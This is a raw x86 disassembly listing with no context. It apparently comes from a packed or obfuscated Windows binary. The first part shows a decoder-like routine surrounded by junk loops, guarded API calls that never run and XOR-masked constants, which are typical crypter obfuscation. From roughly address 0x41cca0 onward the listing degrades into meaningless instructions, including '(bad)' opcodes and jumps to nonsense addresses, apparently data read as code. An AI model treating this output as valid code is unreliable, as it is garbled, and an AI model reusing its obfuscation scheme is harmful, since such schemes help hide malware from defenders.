  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423948
  41c5ea:	push   0x4238ad
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423923
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x42390e
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a44
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0x77d7ebdc
  41ccad:	ins    DWORD PTR es:[edi],dx
  41ccae:	push   eax
  41ccaf:	and    edx,DWORD PTR [edi+0x3c6261fc]
  41ccb5:	pop    edi
  41ccb6:	bound  esp,QWORD PTR [edx+0x76]
  41ccb9:	call   0xb3822bf3
  41ccbe:	or     DWORD PTR [eax+0x362294d3],ecx
  41ccc4:	outs   dx,DWORD PTR ds:[esi]
  41ccc5:	jb     0x41cc55
  41ccc7:	push   ebx
  41ccc8:	add    cl,ah
  41ccca:	fmul   DWORD PTR [eax]
  41cccc:	mov    DWORD PTR [edi+0x34],ebp
  41cccf:	shrd   DWORD PTR ds:0x96da6c80,ebp,cl
  41ccd6:	fild   QWORD PTR [ecx]
  41ccd8:	add    DWORD PTR [ecx-0x2a],ebx
  41ccdb:	adc    eax,0xa3da3561
  41cce0:	rcr    DWORD PTR [edx],0xb
  41cce3:	fldcw  WORD PTR [ebx-0x6f]
  41cce6:	das    
  41cce7:	jns    0x41ccad
  41cce9:	je     0x41ccd9
  41cceb:	outs   dx,DWORD PTR ds:[si]
  41cced:	or     cl,BYTE PTR [eax]
  41ccef:	mov    eax,0x971c06ee
  41ccf4:	out    0xbf,eax
  41ccf6:	xor    DWORD PTR [eax-0x6d],ebp
  41ccf9:	clc    
  41ccfa:	fsubr  DWORD PTR [ebp-0xd4e2218]
  41cd00:	aam    0x9a
  41cd02:	repz aas 
  41cd04:	sbb    al,BYTE PTR [edi+0x5e]
  41cd07:	sub    bl,cl
  41cd09:	sbb    al,0x1b
  41cd0b:	cs push ss
  41cd0d:	add    al,0x1c
  41cd0f:	retf   
  41cd10:	adc    al,0x3f
  41cd12:	mov    al,ds:0x35abe50e
  41cd17:	adc    DWORD PTR [edi+0x16],edx
  41cd1a:	or     esi,DWORD PTR [edi]
  41cd1c:	xor    al,0x5c
  41cd1e:	outs   dx,BYTE PTR ds:[esi]
  41cd1f:	ins    BYTE PTR es:[edi],dx
  41cd20:	adc    al,BYTE PTR [edi-0x5f]
  41cd23:	add    ebx,DWORD PTR [edx-0x3ec5dd3c]
  41cd29:	retf   0x423d
  41cd2c:	inc    eax
  41cd2d:	pop    esi
  41cd2e:	fwait
  41cd2f:	es push ebx
  41cd31:	mov    cl,0xe1
  41cd33:	(bad)  
  41cd34:	cmp    esp,eax
  41cd36:	outs   dx,BYTE PTR ds:[esi]
  41cd37:	or     al,dh
  41cd39:	xor    bl,BYTE PTR [ecx]
  41cd3b:	xor    al,ch
  41cd3d:	cli    
  41cd3e:	retf   
  41cd3f:	lock fwait
  41cd41:	xor    eax,0xc432c749
  41cd46:	or     ch,BYTE PTR [ebx-0x5eef15c5]
  41cd4c:	int    0x1f
  41cd4e:	or     eax,0xa605dce3
  41cd53:	fdiv   DWORD PTR [ebx]
  41cd55:	or     eax,0x6e8471cc
  41cd5a:	jb     0x41cdd2
  41cd5c:	mov    bl,0x3e
  41cd5e:	std    
  41cd5f:	pop    esp
  41cd60:	pop    esp
  41cd61:	mov    ecx,0x6547d3b6
  41cd66:	pop    edi
  41cd67:	sar    DWORD PTR [ecx+0x4772a89a],cl
  41cd6d:	sti    
  41cd6e:	add    DWORD PTR [esi],ebp
  41cd70:	inc    ebx
  41cd71:	add    dl,BYTE PTR [edx+0x71]
  41cd74:	jl     0x41cdb5
  41cd76:	xchg   BYTE PTR [ebp+0x5c],dh
  41cd79:	dec    ebp
  41cd7a:	loopne 0x41cd8c
  41cd7c:	aaa    
  41cd7d:	jmp    0x25cfc722
  41cd82:	jecxz  0x41cd08
  41cd84:	add    eax,0xcb93c0ef
  41cd89:	(bad)  
  41cd8a:	jmp    0x41cd1f
  41cd8c:	and    eax,0x4ceb4e44
  41cd91:	rcr    BYTE PTR [edi],1
  41cd93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd94:	xor    ch,bl
  41cd96:	lock dec esi
  41cd98:	push   ebp
  41cd99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd9a:	or     ecx,esi
  41cd9c:	imul   esp,DWORD PTR [edx+0x5657f455],0x75
  41cda3:	jno    0x41cdf4
  41cda5:	jns    0x41cdc8
  41cda7:	push   ebp
  41cda8:	daa    
  41cda9:	jle    0x41cd5b
  41cdab:	pop    esi
  41cdac:	call   0xecd8:0xfe6af79
  41cdb3:	ins    BYTE PTR es:[edi],dx
  41cdb4:	jle    0x41cd48
  41cdb6:	jo     0x41cd5a
  41cdb8:	fwait
  41cdb9:	push   es
  41cdba:	call   0x5f52:0x82371209
  41cdc1:	in     eax,dx
  41cdc2:	mov    al,0xe3
  41cdc4:	sbb    al,0x28
  41cdc6:	jl     0x41cdd5
  41cdc8:	jge    0x41ce41
  41cdca:	adc    eax,0x129bcf44
  41cdcf:	inc    edi
  41cdd0:	jno    0x41ce4d
  41cdd2:	lea    edx,[ecx+0x6b]
  41cdd5:	sub    al,0xb2
  41cdd7:	jmp    0x102f:0x2cd61159
  41cdde:	es jge 0x41cdb7
  41cde1:	cli    
  41cde2:	stc    
  41cde3:	test   eax,0x5d573fa8
  41cde8:	icebp  
  41cde9:	mov    ds:0x9867bb7e,al
  41cdee:	es ja  0x41ce4b
  41cdf1:	mov    eax,ds:0x582a5d57
  41cdf6:	adc    ecx,DWORD PTR [edi-0x3f]
  41cdf9:	es ret 0x2229
  41cdfd:	push   cs
  41cdfe:	sbb    BYTE PTR [esi+eiz*8+0x3c],0xf4
  41ce03:	pusha  
  41ce04:	jno    0x41cdcd
  41ce06:	adc    eax,0xf401cf80
  41ce0b:	jo     0x41cdea
  41ce0d:	(bad)  
  41ce0e:	adc    DWORD PTR [eax+0x7699de27],esp
  41ce14:	sub    eax,0x4927fcc8
  41ce19:	dec    esp
  41ce1a:	mov    eax,ds:0xcda715cb
  41ce1f:	mov    bh,0xcf
  41ce21:	or     al,0x54
  41ce23:	mov    edi,DWORD PTR ds:0xa8124866
  41ce29:	sub    al,0xa0
  41ce2b:	enter  0xdcae,0x6b
  41ce2f:	cmp    al,0x8c
  41ce31:	mov    BYTE PTR [ebx+esi*8+0x35a547fe],ah
  41ce38:	push   cs
  41ce39:	fst    QWORD PTR [ecx]
  41ce3b:	and    al,0xa8
  41ce3d:	jno    0x41cdd8
  41ce3f:	xor    eax,0x5b201d3
  41ce44:	outs   dx,DWORD PTR ds:[esi]
  41ce45:	sar    ch,1
  41ce47:	adc    al,0x45
  41ce49:	shl    BYTE PTR [edi],1
  41ce4b:	mov    al,0x3c
  41ce4d:	std    
  41ce4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce4f:	pop    ebp
  41ce50:	mov    al,ds:0x4e3e3a34
  41ce55:	sbb    dl,dl
  41ce57:	add    BYTE PTR [edx-0x8],0xae
  41ce5b:	or     eax,0x59d0334b
  41ce60:	jg     0x41cdf6
  41ce62:	adc    bl,BYTE PTR [edx]
  41ce64:	cmc    
  41ce65:	cli    
  41ce66:	ins    DWORD PTR es:[edi],dx
  41ce67:	jne    0x41cebf
  41ce69:	or     eax,edx
  41ce6b:	test   eax,0x2205ae1c
  41ce70:	and    ah,BYTE PTR [edi]
  41ce72:	dec    edx
  41ce73:	push   ebx
  41ce74:	jecxz  0x41ce8b
  41ce76:	fdivr  DWORD PTR [esi+ebp*4]
  41ce79:	push   ds
  41ce7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce7b:	cmp    DWORD PTR [eax+0x1ce6a7e8],esi
  41ce81:	inc    ebp
  41ce82:	scas   al,BYTE PTR es:[edi]
  41ce83:	jg     0x41ce4b
  41ce85:	jle    0x41ce6a
  41ce87:	std    
  41ce88:	mov    bl,0xbd
  41ce8a:	pop    esp
  41ce8b:	aad    0xcc
  41ce8d:	xor    ch,ah
  41ce8f:	push   cs
  41ce90:	xchg   edi,eax
  41ce91:	in     al,dx
  41ce92:	pop    eax
  41ce93:	sub    edi,ebx
  41ce95:	jmp    0x7baf:0x516573d7
  41ce9c:	nop
  41ce9d:	std    
  41ce9e:	add    DWORD PTR [edi+0x4a],esp
  41cea1:	imul   ecx,DWORD PTR [ebp-0x29ada84b],0x23
  41cea8:	sbb    bh,BYTE PTR [ecx-0x1e3d8cf3]
  41ceae:	sub    DWORD PTR [ebp+esi*4-0x61],ebp
  41ceb2:	xor    al,0xde
  41ceb4:	out    0x92,eax
  41ceb6:	jmp    0x74247b9f
  41cebb:	mov    eax,ds:0x213fab6f
  41cec0:	dec    ecx
  41cec1:	add    ebp,DWORD PTR [ebx-0x7d]
  41cec4:	stos   BYTE PTR es:[edi],al
  41cec5:	mov    ebx,0x912ba86b
  41ceca:	aaa    
  41cecb:	sub    DWORD PTR [ebx+0x313925dd],ebx
  41ced1:	or     eax,0x2ee8d11b
  41ced6:	sub    eax,0x171abc76
  41cedb:	inc    esp
  41cedc:	shl    BYTE PTR ds:0x611ee5e7,1
  41cee2:	cmp    BYTE PTR [esi],bl
  41cee4:	dec    ebx
  41cee5:	push   0x97c10a4a
  41ceea:	mov    dh,BYTE PTR [ebp+ebx*4-0x72a8a518]
  41cef1:	sbb    al,0x38
  41cef3:	cmp    ebp,eax
  41cef5:	cli    
  41cef6:	push   eax
  41cef7:	inc    ebx
  41cef8:	outs   dx,DWORD PTR ds:[esi]
  41cef9:	xor    BYTE PTR [ebx+0x25eb61f],dl
  41ceff:	mov    DWORD PTR ds:0xb92b01ba,esp
  41cf05:	mov    cl,BYTE PTR [eax-0x25]
  41cf08:	fimul  WORD PTR [ebx+0x76b9d56f]
  41cf0e:	ds ins BYTE PTR es:[edi],dx
  41cf10:	xor    al,0x62
  41cf12:	mov    ds:0x9f7b3d8,eax
  41cf17:	in     eax,0xe5
  41cf19:	xchg   ebp,eax
  41cf1a:	or     al,0x2
  41cf1c:	xchg   edi,eax
  41cf1d:	xchg   DWORD PTR [esi],ecx
  41cf1f:	xor    DWORD PTR [edi-0x3869ab7e],ecx
  41cf25:	(bad)  
  41cf26:	enter  0x36d2,0x7d
  41cf2a:	xchg   edi,eax
  41cf2b:	outs   dx,BYTE PTR ds:[esi]
  41cf2c:	mov    edi,0x988c8aae
  41cf31:	adc    al,0x2
  41cf33:	loopne 0x41ced3
  41cf35:	inc    edi
  41cf36:	pop    ss
